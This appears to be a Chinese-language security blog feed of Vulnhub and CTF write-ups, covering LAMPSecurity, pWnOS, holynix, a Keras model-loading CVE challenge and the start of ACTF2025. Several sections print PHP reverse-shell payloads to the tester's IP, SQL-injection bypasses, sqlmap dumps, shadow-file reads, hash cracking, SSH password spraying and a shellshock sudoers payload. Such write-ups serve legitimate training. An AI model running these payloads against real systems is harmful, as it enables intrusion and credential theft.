class="line">110/tcp   open  pop3</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">143/tcp   open  imap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">901/tcp   open  samba-swat</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">54651/tcp open  unknown</span><br></pre></td></tr></table></figure><br>用<code>nmap</code>自带的漏洞脚本扫一下，嘶，跟上个靶机的情况一样</p><h2 id="web渗透-5"><a href="#web渗透-5" class="headerlink" title="web渗透"></a>web渗透</h2><p>访问<code>web服务</code>，发现<code>Blo</code>g登陆里面的<code>NanoCM</code>S，小爆一手<code>admin</code>，没有<br>既然是<code>cms</code>，那找找洞<code>searchsploit nanocms</code></p><p><code>NanoCMS v0.4 - Remote Code Execution (RCE) (Authenticated)</code><br>远程代码执行，但需要登陆认证</p><p>继续搜索(<code>nanocms exploit</code>，搜漏洞的话，全是这个靶场的<code>wp</code>)，找到了<code>NanoCMS &#39;/data/pagesdata.txt&#39; Password Hash Information Disclosure Vulnerability</code></p><p><code>s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;9d2f75377ac0ab991d40c91fd27e52fd&quot;;</code><br><a href="https://www.somd5.com/">somd5</a>查一手，得到<code>shannon</code></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>随便找个可以编辑代码的地方，插进去(因为这里就是个<code>php</code>文件)<br><code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1&#39;&quot;); ?&gt;</code><br>然后访问</p><p><code>cat /etc/passwd</code>，看见了很多有<code>/bin/bash</code>环境的用户，但没有密码，也看不了<code>shadow</code>文件</p><p>注意隐藏目录<code>ls -al</code>，<code>/home</code>目录下，<code>patrick</code>目录发现了tomboy桌面笔记软件，看看历史<code>.tomboy.log</code><br><code>12/5/2012 7:25:03 AM [DEBUG]: Saving &#39;Root password&#39;...</code></p><p>或者直接搜<code>pass字符串</code>(这也是个找关键字符串的好东西啊)，<code>grep -R -i pass /home/* 2&gt;/dev/null</code></p><p><code>cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note</code><br>得到<code>50$cent</code><br>可交互<code>shell</code>，<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>切换<code>root</code>用户，<code>su root</code></p><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>多翻翻用户的日志？看用户整了点什么操作</p><h1 id="LAMPSecurity-CTF7"><a href="#LAMPSecurity-CTF7" class="headerlink" title="LAMPSecurity: CTF7"></a>LAMPSecurity: CTF7</h1><h2 id="主机发现与端口扫描-4"><a href="#主机发现与端口扫描-4" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p>emmm，重启了好几次都扫不到，<a href="https://blog.csdn.net/sinat_35845281/article/details/126067936">参考修改配置文件</a></p><p>后面才发现原来打开靶机的时候要选择<code>我已移动该虚拟机</code></p><p><code>192.168.32.135</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE  SERVICE</span><br><span class="line">22/tcp    open   ssh</span><br><span class="line">80/tcp    open   http</span><br><span class="line">137/tcp   closed netbios-ns</span><br><span class="line">138/tcp   closed netbios-dgm</span><br><span class="line">139/tcp   open   netbios-ssn</span><br><span class="line">901/tcp   open   samba-swat</span><br><span class="line">5900/tcp  closed vnc</span><br><span class="line">8080/tcp  open   http-proxy</span><br><span class="line">10000/tcp open   snet-sensor-mgmt</span><br></pre></td></tr></table></figure></p><p>都扫了一遍，没什么东西</p><h2 id="web渗透-6"><a href="#web渗透-6" class="headerlink" title="web渗透"></a>web渗透</h2><p><strong>80端口</strong>这边，貌似只有注册用户，连登陆界面都没有看见，<strong>SQL注入</strong>也试了一下，不行</p><p><strong>8080端口</strong>上来就是登陆，然后抓包想爆一下，发现了这东西<br><img src="https://pica.zhimg.com/80/v2-8724623d7c79244129100f1003ae1196_1440w.png" alt=""><br><code>&lt;!--select * from users where username=&#39;admin&#39; AND password=md5(&#39;admin123&#39;) and is_admin=1--&gt;</code><br>这里就很舒服了，直接<strong>单引号闭合</strong>，<strong>万能密码登陆</strong>，<code>&#39; or 1=1 #</code>，密码随便</p><p><code>http://192.168.32.135:8080/readings.php</code>，找个编辑框写入<strong>反弹shell</strong>，<code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1&#39;&quot;); ?&gt;</code></p><p><code>There was a problem uploading to /var/www/html/assets/</code><br>发现他们下载的文件都在<code>/var/www/html/assets/</code>，但我们代码是无法被执行的</p><p>并且这个目录下的内容是可访问的，我们可以直接把<strong>反弹shell</strong>语句写入到文件，然后上传（其他两个位置是无法上传文件的）</p><p><code>http://192.168.32.135/assets/</code>访问该文件即可</p><h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>获取<strong>交互shell</strong></p><p><code>sudo -l</code> 查看权限，没密码<br><code>cat /etc/passwd</code><br><code>cat /etc/shadow</code>，没权限</p><p>回到<code>web目录</code>，回退，<code>/var/www/admin</code>，然后在<code>/var/www/admin/inc/db.php</code>发现<strong>数据库密码为空</strong><br><code>mysql -u root -p</code><br>直接就登进来了<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use website;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></p><p>复制账号密码，然后保存利用命令行导出密码哈希<br><code>cat up | awk -F &#39; &#39; &#123;&#39;print $4&#39;&#125; &gt; password.txt</code></p><p>先解压<strong>rockyou字典</strong>，<code>sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p><p><code>hashcat -a 0 -m 0 password.txt /usr/share/wordlists/rockyou.txt</code><br>以前想用<code>hashcat</code>爆，发现都是没内存？然后这次<a href="https://www.cnblogs.com/micr067/p/16494384.html">参考</a>修改，换成单核(1*4，之前2*2)，内存拉到4g(以前2g)</p><p>把爆破结果复制保存，然后继续分割<br><code>cat pass.txt | awk -F &#39;:&#39; &#123;&#39;print $2&#39;&#125; &gt; password</code><br>用户名也搞一手<br><code>cat up | awk -F &#39; &#39; &#123;&#39;print $2&#39;&#125; | awk -F &#39;@&#39; &#123;&#39;print $1&#39;&#125; &gt; username</code></p><h2 id="密码喷射脚本登陆ssh"><a href="#密码喷射脚本登陆ssh" class="headerlink" title="密码喷射脚本登陆ssh"></a>密码喷射脚本登陆ssh</h2><p><code>apt-get install crackmapexec</code></p><p><code>crackmapexec ssh 192.168.32.135 -u username -p password --continue-on-success</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brian:my2cents</span><br><span class="line">alice:turtles77</span><br><span class="line">leon:qwer1234</span><br><span class="line">julia:madrid </span><br><span class="line">michael:somepassword</span><br><span class="line">charles:chuck33</span><br></pre></td></tr></table></figure><p><code>ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss brian@192.168.32.135 -o macs=hmac-sha1-96</code></p><p>有密码直接root就好了</p><h2 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h2><ul><li>数据库中肯定会记录一些关键信息，看看有没有办法获取</li><li>批量ssh登陆，<code>crackmapexec</code>是个好东西</li></ul><h1 id="pWnOS2-0"><a href="#pWnOS2-0" class="headerlink" title="pWnOS2.0"></a>pWnOS2.0</h1><h2 id="主机发现与端口扫描-5"><a href="#主机发现与端口扫描-5" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p>需要先将<code>vmware</code>的子网设成<code>10.10.10.0</code><br><code>nmap -sn 10.10.10.0/24</code><br>这个靶机<strong>固定ip</strong>为<code>10.10.10.100</code></p><p>只扫出了<code>22、80</code>端口，<code>vuln脚本</code>扫描可以发现是一个<strong>博客系统</strong></p><h2 id="目录扫描-4"><a href="#目录扫描-4" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>没什么关键信息，从<code>/blog</code>入手</p><h2 id="web渗透-7"><a href="#web渗透-7" class="headerlink" title="web渗透"></a>web渗透</h2><p>开始一顿乱点，<strong>万能密码</strong>还能登陆，但没鸟用</p><p>但这里还可以<strong>sql注入</strong>，抓登陆包保存，然后<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r packet.txt --dbs </span><br><span class="line">sqlmap -r packet.txt -D ch16 --tables</span><br><span class="line">sqlmap -r packet.txt -D ch16 -T users --columns</span><br><span class="line">sqlmap -r packet.txt -D ch16 -T users -C first_name,last_name,pass --dump</span><br></pre></td></tr></table></figure><br>可惜<code>kali</code>这边没爆出来但是拿到了密码哈希，可以在线网站解，但后面发现根本没用</p><p><code>/blog/rss.php</code>，发现<code>SPHPBLOG 0.4.0</code>，<code>index.ph</code>p显示的是<code>Simple PHP Blog 0.4.0</code>，那就是一个<strong>博客cms</strong>喽，也可以用<code>whatweb</code>识别一下<code>whatweb http://10.10.10.100/blog/</code></p><p><code>searchsploit Simple PHP Blog 0.4.0</code><br><code>searchsploit Simple PHP Blog 0.4.0 -m 1191.pl</code><br><code>perl</code>脚本，安装依赖<code>apt install libswitch-perl</code></p><p><code>perl 1191.pl</code>看看怎么个用法<br><code>perl 1191.pl -h http://10.10.10.100/blog -e 3 -U HvAng -P HvAng</code><br>1和2都没利用到，2的哈希一看就是<strong>加盐</strong>了，破解不了</p><p>登陆后，<code>new blog</code>可写入<strong>shell语句</strong>但貌似无法访问</p><p>找到一个上传图像的页面<code>/blog/upload_img.php</code>，<code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.128/2333 0&gt;&amp;1&#39;&quot;);?&gt;</code><br>上传<code>shell.php</code>之后拿不到路径，那就大胆猜测一手<code>/blog/images</code></p><p>发现上面<code>1</code>的<code>cmd.php</code>也在这<code>http://10.10.10.100/blog/images/cmd.php?cmd=</code>，不过还是终端好用</p><h2 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h2><p><code>dpkg -l | grep python</code><br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><br>翻了一下<code>/etc/passwd</code> <code>/etc/shadow</code> <code>/etc/crontab</code>，找到了用户<code>Dan</code>有<code>/bin/bash</code>环境，然后继续找找数据库，找到<strong>数据库配置文件</strong><br><code>cat /var/www/mysqli_connect.php</code><br><code>mysql -u root -p</code>，密码<code>goodday</code>，居然不对<br>再找一下，<code>find / -name &#39;mysqli_connect.php&#39; 2&gt;/dev/null</code>，得到<code>/var/mysqli_connect.php</code><br>密码为<code>root@ISIntS</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use ch16;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><p>得到<code>Dan</code>的<strong>密码哈希</strong><code>c2c4b4e51d9e23c02c15702c136c3e950ba9a4af</code>，在线网站得到<code>killerbeesareflying</code><br>丢，密码不对<br>尝试直接<code>root</code>，<code>ssh root@10.10.10.100</code>，密码<code>root@ISIntS</code>，阿西吧</p><h2 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2><p>还是要注意<strong>数据库敏感信息</strong></p><h1 id="pWnOS1-0"><a href="#pWnOS1-0" class="headerlink" title="pWnOS1.0"></a>pWnOS1.0</h1><h2 id="主机发现与端口扫描-6"><a href="#主机发现与端口扫描-6" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p>现在学聪明了，都选择<strong>我已移动虚拟机</strong><br><code>192.168.32.128</code>，我的<code>kali</code>到129了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br></pre></td></tr></table></figure><p>好像没什么信息了</p><h2 id="web渗透-8"><a href="#web渗透-8" class="headerlink" title="web渗透"></a>web渗透</h2><p>对参数进行修改，触发报错<br><code>http://192.168.32.128/index1.php?help=true&amp;connect=</code>，<code>Warning: include()</code>可知此处可以进行文件包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash</span><br><span class="line">obama:x:1001:1001::/home/obama:/bin/bash</span><br><span class="line">osama:x:1002:1002::/home/osama:/bin/bash</span><br><span class="line">yomama:x:1003:1003::/home/yomama:/bin/bash</span><br></pre></td></tr></table></figure><p>访问扫描的目录，<code>http://192.168.32.128/php/phpMyAdmin/</code><br>发现<code>phpMyAdmin 2.6.3-pl1</code>，没密码，先放一边</p><p>那就只有<strong>10000端口</strong>可以访问了，是<code>webmin</code>的登陆界面，找默认账密，登不上去</p><p><code>searchsploit webmin</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                      | multiple/remote/1997.php</span><br><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                      | multiple/remote/2017.pl</span><br></pre></td></tr></table></figure><br>有<strong>任意文件读取</strong>漏洞，正好我们读不到<code>shadow</code>文件，我们可以试试看<br><code>searchsploit webmin -m 2017.pl</code><br><code>perl 2017.pl -h</code><br><code>perl 2017.pl 192.168.32.128 10000 /etc/shadow 0</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::</span><br><span class="line">obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::</span><br><span class="line">osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::</span><br><span class="line">yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::</span><br></pre></td></tr></table></figure><br>上面内容保存为<code>hash</code>文件<br><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p>得到<code>vmware/h4ckm3</code></p><p><code>ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss vmware@192.168.32.128 -o macs=hmac-sha1-96</code></p><h2 id="提权-3"><a href="#提权-3" class="headerlink" title="提权"></a>提权</h2><p>这台机子跑不了<code>sudo</code>，看了下定时任务，貌似没思路</p><p>然后，前面读取的<code>shadow</code>文件，肯定是以<strong>root</strong>的权限读取的，那么我们通过靶机执行我们的<code>反弹shell</code>脚本就可以<strong>root</strong>了</p><p><code>cp /usr/share/webshells/perl/perl-reverse-shell.pl shell.cgi</code>并且<code>vim</code>修改<code>ip</code>和端口</p><p><code>kali</code>开启<code>web</code>服务<code>php -S 0:80</code><br>靶机下载<code>wget http://192.168.32.129/shell.cgi</code>，并添加<strong>执行权限</strong>，<code>chmod +x shell.cgi</code></p><p><code>perl 2017.pl 192.168.32.128 10000 /home/vmware/shell.cgi 0</code><br><code>kali</code>开启监听</p><p>这里必须使用<code>cgi</code>后缀的原因貌似是，靶机的作者对<code>apache</code>中间件做了<strong>解析后缀</strong>的限制，但是没有限制<code>cgi</code>文件，其他的<code>php</code>、<code>pl</code>文件都无法执行</p><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>还是根据上面的<strong>任意文件读取</strong>漏洞来的，因为我们可能未必能读到<code>shadow</code>文件，<strong>权限不够</strong></p><h3 id="ssh敏感文件Authorized-keys获取"><a href="#ssh敏感文件Authorized-keys获取" class="headerlink" title="ssh敏感文件Authorized_keys获取"></a>ssh敏感文件Authorized_keys获取</h3><p>根据参考文章：<code>OpenSSL 0.9.8e</code>这个版本的<code>OpenSSL</code>可以<strong>根据公钥找到私钥</strong>，实现<strong>免密登陆</strong>（可是你没登陆靶机怎么知道哪个版本呢？）</p><p><code>perl 2017.pl 192.168.32.128 10000 /home/vmware/.ssh/authorized_keys 0</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM/LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgvQuiE5Wy9DwYVfLrkkcDB2uubtMzGw9hl3smD/OwUyXc/lNED7MNLS8JvehZbMJv1GkkMHvv1Vfcs6FVnBIfPBz0OqFrEGf+a4JEc/eF2R6nIJDIgnjBVeNcQaIM3NOr1rYPzgDwAH/yWoKfzNv5zeMUkMZ7OVC54AovoSujQC/VRdKzGRhhLQmyFVMH9v19UrLgJB6otLcr3d8/uAB2ypTw+LmuIPe9zqrMwxskdfY4Sth2rl6D3bq6Fwca+pYh++phOyKeDPYkBi3hx6R3b3ETZlNCLJjG7+t7kwFdF02Iuw== vmware@ubuntuvm</span><br></pre></td></tr></table></figure><p>这个版本的<code>OpenSSH</code>用了伪随机数获取密钥，我们可以用伪随机数生成器<code>PRG</code>(pseudo random number generator)进行私钥的破解</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit prng </span><br><span class="line">searchsploit prng -m 5622.txt</span><br><span class="line">cat 5622.txt</span><br><span class="line">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2</span><br><span class="line">tar -jxvf 5622.tar.bz2</span><br><span class="line">grep -lr &#x27;AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM/LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgvQ&#x27;</span><br><span class="line">cp rsa/2048/d8629ce6dc8f2492e1454c13f46adb26-4566 private_key</span><br></pre></td></tr></table></figure><p><code>ssh -i private_key -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss vmware@192.168.32.128 -o macs=hmac-sha1-96</code></p><p>难绷，<code>windows</code>这边也登不上去了，还是需要密码，<code>kali</code>直接<code>command-line line 0: Bad key types &#39;ssh-rsa,ssh-dss&#39;.</code>，不会整了，蒜鸟蒜鸟</p><p>所以，这一步正常的话是可以通过私钥文件，免密登陆的</p><h3 id="shellshock漏洞提权"><a href="#shellshock漏洞提权" class="headerlink" title="shellshock漏洞提权"></a>shellshock漏洞提权</h3><p><code>bash --version</code>，<code>GNU bash, version 3.2.25(1)-release (i486-pc-linux-gnu)</code>，远低于4.3版本，我们可以用<strong>shellshock漏洞</strong>提权</p><p><code>vim shellshockexp.cgi</code>，写入<code>#!/bin/bash</code></p><p><code>curl &#39;http://192.168.32.128:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/shellshockexp.cgi&#39; -A &#39;() &#123; :; &#125;; /bin/echo &quot;vmware ALL=(ALL)NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#39;</code></p><p>好吧，这一步也不行，成功的情况只返回一行？<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;Error - Missing Content-Type Header&lt;/h1&gt;</span><br><span class="line">&lt;pre&gt;Failed to exec /usr/local/webmin/mscstyle3/unauthenticated/../../../../../../../../../../../../../../home/vmware/shellshockexp.cgi : Permission denied</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure></p><p>正常来说，<code>sudo /bin/bash</code>即可提权成功了</p><p>同样的，<strong>Linux内核版本</strong>也较低，可以尝试<strong>内核提权</strong>，找好<code>exp</code>即可<br><code>Linux ubuntuvm 2.6.22-14-server</code></p><h2 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h2><p>需要关注一些特殊文件的读取权限，看看能否成为突破口；还有就是关注低版本服务的漏洞</p><h1 id="holynix-未完成"><a href="#holynix-未完成" class="headerlink" title="holynix(未完成)"></a>holynix(未完成)</h1><h2 id="主机发现与端口扫描-7"><a href="#主机发现与端口扫描-7" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p><code>nmap -sn 192.168.32.0/24</code><br><code>192.168.32.130</code><br><code>nmap --min-rate 10000 -p- 192.168.32.130</code><br>只扫出了80端口<br>扫描脚本也没什么东西，SQL注入这些</p><h2 id="web渗透-9"><a href="#web渗透-9" class="headerlink" title="web渗透"></a>web渗透</h2><p>一进去是个登陆界面，不是市面上的cms<br>一开始在用户名处试万能密码，没反应，那就看看报错位置，账密都输入单引号，然后报错了<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL Error:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;&#x27; at line 1</span><br><span class="line">SQL Statement:SELECT * FROM accounts WHERE username=&#x27;\&#x27;&#x27; AND password=&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><br>原来用户名这里被转义了</p><p><code>xx/&#39; or 1=1#</code></p><p>发现上传，但没权限<code>Home directory uploading disabled for user alamo</code><br><code>Security</code>这里可以文件读取，但get看不见请求，尝试post<br><code>http://192.168.32.130/index.php?page=ssp.php</code><br>请求体<code>B=Display+File&amp;text_file_name=ssp%2Femail.txt</code><br><code>text_file_name</code>可以实现文件读取</p><p>(可能不更新了)……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;此文诞生于本人实习期间，属于是&lt;strong&gt;摸鱼成果&lt;/strong&gt;，虽然但是也没打几个靶场，毕竟哪有这么爽的鱼可以摸&lt;/p&gt;
&lt;p&gt;只能说&lt;code&gt;vulnhub&lt;/code&gt;这边的靶场比较偏向教育性质，适合新手，可能进阶的那些我还没接触()&lt;/p&gt;
&lt;p&gt;在某次训</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>零散Web题记录</title>
    <link href="https://hvang10.github.io/2025/06/01/%E9%9B%B6%E6%95%A3web%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://hvang10.github.io/2025/06/01/%E9%9B%B6%E6%95%A3web%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2025-05-31T18:44:13.000Z</published>
    <updated>2025-05-31T18:58:02.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="D3CTF2025-d3model"><a href="#D3CTF2025-d3model" class="headerlink" title="D3CTF2025 - d3model"></a>D3CTF2025 - d3model</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_model</span>(<span class="params">modelname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        keras.models.load_model(modelname)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No file part&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No selected file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    MAX_FILE_SIZE = <span class="number">50</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 50MB</span></span><br><span class="line">    file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">    file_size = file.tell()</span><br><span class="line">    file.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;test.keras&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    file.save(filepath)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is_valid_model(filepath):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Model is valid&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>这题很明显，唯一的漏洞利用点在<code>is_valid_model()</code>函数，搜索<code>keras.models.load_model()</code>漏洞，发现了最近的<code>CVE-2025-1550</code>，找到了<a href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">攻击参考博客</a></p><p>然后比赛的时候没打出来。。。<br>赛后发现是，对<strong>python的subprocess模块</strong>了解还是不够深入（上次记录过一次，但还是忘了，emmm）</p><p>需要修改的地方为<code>&quot;inbound_nodes&quot;: [&#123;&quot;args&quot;: [[&quot;env &gt;&gt; index.html&quot;]], &quot;kwargs&quot;: &#123;&quot;bufsize&quot;: -1, &quot;shell&quot;: True&#125;&#125;]</code><br><code>json文件</code>也相对应做修改，不然的话，命令无法<strong>通过shell执行</strong>。。。</p><blockquote><p>如果shell为True，那么指定的命令将通过shell执行。如果我们需要访问某些shell的特性，如管道、文件名通配符、环境变量扩展功能，这将是非常有用的。</p></blockquote><p>还有就是这题貌似是<strong>不出网</strong>的，但<code>docker</code>文件里面告诉了我们<code>flag</code>在<strong>环境变量</strong>中，并且只有<code>index.html</code>可写。。。</p><p>最简单的题没打出来……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;D3CTF2025-d3model&quot;&gt;&lt;a href=&quot;#D3CTF2025-d3model&quot; class=&quot;headerlink&quot; title=&quot;D3CTF2025 - d3model&quot;&gt;&lt;/a&gt;D3CTF2025 - d3model&lt;/h1&gt;&lt;figure c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ACTF2025</title>
    <link href="https://hvang10.github.io/2025/04/26/ACTF2025/"/>
    <id>https://hvang10.github.io/2025/04/26/ACTF2025/</id>
    <published>2025-04-26T09:21:20.000Z</published>
    <updated>2025-05-02T17:44:43.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><blockquote><p>签到：<a href="https://github.com/team-s2/ACTF-2025">https://github.com/team-s2/ACTF-2025</a></p></blockquote><p><img src="https://picx.zhimg.com/80/v2-be1c2454925cc232fe32bdc9dce6ec1a_1440w.png" alt=""><br><strong>ACTF{w3lc0ME2aCtf2O25h@veAn1ceDAY}</strong></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="not-so-web-1"><a href="#not-so-web-1" class="headerlink" title="not so web 1"></a>not so web 1</h2><blockquote><p>Web不够，其他来凑</p></blockquote><p>这题也算是<code>web</code>吧，<strong>AES-CBC字节翻转攻击</strong></p><p>先随便注册个账号登进去，拿到<code>server code (encoded)</code>，解<code>base64</code>即可得到<strong>题目源码</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span 